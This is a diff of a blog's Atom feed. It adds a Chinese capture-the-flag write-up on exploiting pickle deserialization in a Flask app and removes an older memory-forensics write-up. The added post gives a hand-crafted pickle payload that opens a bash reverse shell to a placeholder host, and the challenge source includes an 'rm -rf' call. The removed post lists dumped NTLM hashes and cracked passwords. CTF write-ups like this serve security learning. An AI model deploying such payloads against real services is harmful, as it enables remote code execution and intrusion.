@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://daffodi11.github.io</id>
     <title>Daffodil</title>
-    <updated>2022-08-01T02:27:05.186Z</updated>
+    <updated>2022-08-01T04:20:20.209Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://daffodi11.github.io"/>
     <link rel="self" href="https://daffodi11.github.io/atom.xml"/>
@@ -10,6 +10,105 @@
     <logo>https://daffodi11.github.io/images/avatar.png</logo>
     <icon>https://daffodi11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, Daffodil</rights>
+    <entry>
+        <title type="html"><![CDATA[Web-crash-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-crash-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-crash-writeup/">
+        </link>
+        <updated>2022-08-01T04:03:28.000Z</updated>
+        <content type="html"><![CDATA[<p>打开题目看到源码 是python Flask<br>
+<img src="https://daffodi11.github.io/post-images/1659326644548.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659326648822.jpg" alt="" loading="lazy"></p>
+<pre><code class="language-python">
+import base64
+# import sqlite3
+import pickle
+from flask import Flask, make_response,request, session
+import admin
+import random
+
+app = Flask(__name__,static_url_path='')
+app.secret_key=random.randbytes(12)
+
+class User:
+    def __init__(self, username,password):
+        self.username=username
+        self.token=hash(password)
+
+def get_password(username):
+    if username==&quot;admin&quot;:
+        return admin.secret
+    else:
+        # conn=sqlite3.connect(&quot;user.db&quot;)
+        # cursor=conn.cursor()
+        # cursor.execute(f&quot;select password from usertable where username='{username}'&quot;)
+        # data=cursor.fetchall()[0]
+        # if data:
+        #     return data[0] 
+        # else:
+        #     return None
+        return session.get(&quot;password&quot;)
+
+@app.route('/balancer', methods=['GET', 'POST'])
+def flag():
+    pickle_data=base64.b64decode(request.cookies.get(&quot;userdata&quot;))
+    if b'R' in pickle_data or b&quot;secret&quot; in pickle_data:
+        return &quot;You damm hacker!&quot;
+    os.system(&quot;rm -rf *py*&quot;)
+    userdata=pickle.loads(pickle_data)
+    if userdata.token!=hash(get_password(userdata.username)):
+         return &quot;Login First&quot;
+    if userdata.username=='admin':
+        return &quot;Welcome admin, here is your next challenge!&quot;
+    return &quot;You're not admin!&quot;
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    resp = make_response(&quot;success&quot;) 
+    session[&quot;password&quot;]=request.values.get(&quot;password&quot;)
+    resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600)
+    return resp
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    return open('source.txt',&quot;r&quot;).read()
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+
+</code></pre>
+<p>考察python 反序列化 过滤了R操作符<br>
+用o操作符弹shell 参考https://xz.aliyun.com/t/8342</p>
+<pre><code class="language-python">import base64
+
+print(base64.b64encode(b'(cos\nsystem\nX\x33\x00\x00\x00bash -c &quot;bash -i &gt;&amp; /dev/tcp/XX.XX.XX.XX/7788 0&gt;&amp;1&quot;o.'))
+
+print(hex(len('bash -c &quot;bash -i &gt;&amp; /dev/tcp/XX.XX.XX.XX/7788 0&gt;&amp;1&quot;')))
+</code></pre>
+<p>替换cookies弹shell<br>
+<img src="https://daffodi11.github.io/post-images/1659326992331.jpg" alt="" loading="lazy"></p>
+<p>题目提示504页面 直接再起一个Flask</p>
+<pre><code class="language-python">from flask import Flask
+import random
+import time
+app = Flask(__name__,static_url_path='')
+app.secret_key=random.randbytes(12)
+
+@app.route('/',methods=['GET','POST'])
+def index():
+	time.sleep(9000)
+	return &quot;ok&quot;
+if __name__ == '__main__':
+	app.run(host='0.0.0.0',port=5000)
+</code></pre>
+<p>没有vi vim 用cat 写入app.py<br>
+<img src="https://daffodi11.github.io/post-images/1659327362470.jpg" alt="" loading="lazy"><br>
+启动 python3 app.py<br>
+<img src="https://daffodi11.github.io/post-images/1659327367178.jpg" alt="" loading="lazy"><br>
+再次请求首页 拿到flag<br>
+<img src="https://daffodi11.github.io/post-images/1659327604509.jpg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Web-babyweb-writeup]]></title>
         <id>https://daffodi11.github.io/post/web-babyweb-writeup/</id>
@@ -821,61 +920,6 @@ for i in range(0,129488):
 base64转图片得到FLAG<br>
 <img src="https://daffodi11.github.io/post-images/1644761718794.png" alt="" loading="lazy"><br>
 <img src="https://daffodi11.github.io/post-images/1644761724400.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Misc-层层取证-writeup]]></title>
-        <id>https://daffodi11.github.io/post/misc-ceng-ceng-qu-zheng-writeup/</id>
-        <link href="https://daffodi11.github.io/post/misc-ceng-ceng-qu-zheng-writeup/">
-        </link>
-        <updated>2022-02-13T13:40:31.000Z</updated>
-        <content type="html"><![CDATA[<p>题目下载下来是disk_image.rar memdump.rar 一个是内存映像 一个是磁盘映像<br>
-先用volatility分析内存映像 先用imageinfo查看映像具体信息 拿到profile<br>
-/home/kali/Desktop/volatility_2.6_lin64_standalone -f &quot;/home/kali/Desktop/memdump.mem&quot; imageinfo<br>
-<img src="https://daffodi11.github.io/post-images/1644759803615.png" alt="" loading="lazy"><br>
-在查看其他基本信息:进程信息pslist  cmd命令 cmdscan 文件信息 fielscan 账户密码 hashdump<br>
-<img src="https://daffodi11.github.io/post-images/1644759825996.png" alt="" loading="lazy"><br>
-发现有可疑进程 notepad.exe dump下来 grep一下看看有没有什么关键信息<br>
-<img src="https://daffodi11.github.io/post-images/1644759872036.png" alt="" loading="lazy"><br>
-<img src="https://daffodi11.github.io/post-images/1644759876332.png" alt="" loading="lazy"><br>
-strings -e l /home/kali/Desktop/notepad/3056.dmp | grep flag.txt<br>
-可以发现这里有一个flag.txt在xiaoming的桌面  然后CMDSCAN 啥的都没有可用的信息<br>
-这里在去提取一下账户密码<br>
-<img src="https://daffodi11.github.io/post-images/1644759909026.png" alt="" loading="lazy"><br>
-/home/kali/Desktop/volatility_2.6_lin64_standalone -f &quot;/home/kali/Desktop/memdump.mem&quot; --profile=Win7SP1x64 hashdump<br>
-Volatility Foundation Volatility Framework 2.6<br>
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
-XinSai:1000:aad3b435b51404eeaad3b435b51404ee:27caa41e7118fd4429d9b9cbd87aaa40:::<br>
-XiaoMing:1001:aad3b435b51404eeaad3b435b51404ee:92efa7f9f2740956d51157f46521f941:::</p>
-<p>去CMD5解密 只能解密xiaoming的 admin和guest是空 xinsai的解不来<br>
-<img src="https://daffodi11.github.io/post-images/1644759939987.png" alt="" loading="lazy"><br>
-密码是 xiaoming_handsome<br>
-这里感觉xiaoming 很关键 在grep一下xiaoming<br>
-<img src="https://daffodi11.github.io/post-images/1644760005974.png" alt="" loading="lazy"><br>
-发现xiaoming1314<br>
-直接用010editer在内存映像里搜xiaoming1314<br>
-发现一个RTF文件 还原出来看一下<br>
-<img src="https://daffodi11.github.io/post-images/1644760025088.png" alt="" loading="lazy"><br>
-<img src="https://daffodi11.github.io/post-images/1644760039695.png" alt="" loading="lazy"><br>
-得到一个word文档密码：xiaoming1314<br>
-在内存映像里猛搜 docx doc word 都没有的情况下 转战磁盘映像！<br>
-先用FTK imager加载 记得要选可读写<br>
-<img src="https://daffodi11.github.io/post-images/1644760098012.png" alt="" loading="lazy"><br>
-挂载之后发现一个加密磁盘 一个正常磁盘 直接去xiaoming桌面看flag<br>
-<img src="https://daffodi11.github.io/post-images/1644760111166.png" alt="" loading="lazy"><br>
-提示发现要仿真 百度一下方法 https://www.cnblogs.com/ndash/p/NDASH.html<br>
-这里有详细方法 但是我VM 一直引导失败 折腾了两个小时 于是直接放弃 我继续在磁盘翻翻文件<br>
-去找那个word文档  功夫不负苦心人 我最后在G:\Users\XiaoMing\AppData\Local\Temp发现两个流量文件 直接点进去看 分析一下 体积大一点的流量包 一无所获  但是体积小的流量包 挨个追踪数据流  最后发现了RAR文件<br>
-<img src="https://daffodi11.github.io/post-images/1644760136026.png" alt="" loading="lazy"><br>
-16进制原始数据保存<br>
-<img src="https://daffodi11.github.io/post-images/1644760151823.png" alt="" loading="lazy"><br>
-打开这个rar 提示与开机密码相同 还记得咱们提取的xiaoming的密码吗 xiaoming_handsome<br>
-<img src="https://daffodi11.github.io/post-images/1644760166748.png" alt="" loading="lazy"><br>
-解压出来 打开flag.docx 可以发现 这个就是那个word  密码也知道了 xiaoming1314<br>
-<img src="https://daffodi11.github.io/post-images/1644760189898.png" alt="" loading="lazy"><br>
-<img src="https://daffodi11.github.io/post-images/1644760433106.png" alt="" loading="lazy"><br>
-flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2}</p>
 ]]></content>
     </entry>
 </feed>
